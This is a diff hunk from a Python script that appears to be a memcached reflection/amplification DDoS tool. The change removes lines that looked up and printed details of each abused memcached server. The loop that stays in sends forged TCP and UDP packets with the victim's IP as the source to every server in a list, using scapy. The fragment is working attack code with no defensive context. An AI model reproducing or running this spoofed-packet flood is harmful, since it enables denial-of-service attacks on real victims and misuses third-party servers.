@@ -59,9 +59,6 @@ while True:
         counter= int(0)
         for i in ip_array:
             print('[+] Sending 2 forged synchronized payloads to: %s' % (i))
-            host = api.host('%s' % x)
-            counter=counter+1
-            print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
             with suppress_stdout():
                send(IP(src=target, dst='%s' % i) / TCP(sport=int(str(targetport)),dport=targetport)/Raw(load=setdata))
                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=targetport)/Raw(load=getdata))
